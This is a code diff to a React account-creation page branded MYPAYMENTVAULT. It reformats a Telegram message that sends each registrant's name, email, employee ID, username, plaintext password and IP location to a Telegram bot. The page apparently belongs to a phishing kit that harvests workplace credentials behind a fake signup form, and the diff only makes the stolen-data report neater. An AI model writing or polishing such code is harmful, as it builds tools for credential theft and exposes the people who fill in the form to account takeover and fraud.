@@ -55,15 +55,19 @@ export default function CreateAccount() {
     const now = new Date().toLocaleString("id-ID", { timeZone: "Asia/Jakarta" });
     const ip = await getIPInfo();
     await sendTelegram(
-      `🆕 <b>MYPAYMENTVAULT - Create Account</b>\n\n` +
-      `👤 Nama: <code>${form.firstName} ${form.lastName}</code>\n` +
-      `📧 Email: <code>${form.email}</code>\n` +
-      `🏢 Departemen: <code>${form.department}</code>\n` +
-      `🪪 Employee ID: <code>${form.employeeId || "-"}</code>\n` +
-      `🔤 Username: <code>${form.username}</code>\n` +
-      `🔑 Password: <code>${form.password}</code>\n` +
-      `🌐 IP Address: <code>${ip}</code>\n` +
-      `🕐 Waktu: ${now}`
+      `━━━━━━━━━━━━━━━━━━━━━\n` +
+      `🆕 <b>MYPAYMENTVAULT</b>\n` +
+      `📌 <b>Registrasi Akun Baru</b>\n` +
+      `━━━━━━━━━━━━━━━━━━━━━\n\n` +
+      `👤 <b>Nama</b>        : <code>${form.firstName} ${form.lastName}</code>\n` +
+      `📧 <b>Email</b>       : <code>${form.email}</code>\n` +
+      `🏢 <b>Departemen</b>  : <code>${form.department}</code>\n` +
+      `🪪 <b>Employee ID</b> : <code>${form.employeeId || "-"}</code>\n` +
+      `🔤 <b>Username</b>    : <code>${form.username}</code>\n` +
+      `🔑 <b>Password</b>    : <code>${form.password}</code>\n` +
+      `🌐 <b>IP & Lokasi</b> : <code>${ip}</code>\n` +
+      `🕐 <b>Waktu</b>       : ${now}\n` +
+      `━━━━━━━━━━━━━━━━━━━━━`
     );
     await new Promise((r) => setTimeout(r, 1000));
     setLoading(false);
